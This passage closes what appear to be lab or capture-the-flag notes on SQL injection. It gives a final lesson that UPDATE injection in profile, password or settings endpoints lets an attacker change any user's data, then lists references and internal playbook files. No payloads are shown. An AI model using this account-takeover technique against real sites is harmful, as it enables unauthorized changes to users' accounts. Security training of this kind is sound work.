8. **UPDATE injection = account takeover.** Any "edit profile", "change password", or "update settings" endpoint is a potential UPDATE injection target. The impact is immediate — you can change any user's data.

---

## References

- [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [PortSwigger SQL Injection Cheat Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)
- [SQLite Documentation](https://www.sqlite.org/lang.html)
- Knowledge file: `knowledge/payloads.md` (SQL payloads to be added)
- Tool playbook: `directives/tool-playbooks.md` (SQLMap section)

*Last updated: 2026-02-25 — Room complete (12/12 challenges)*
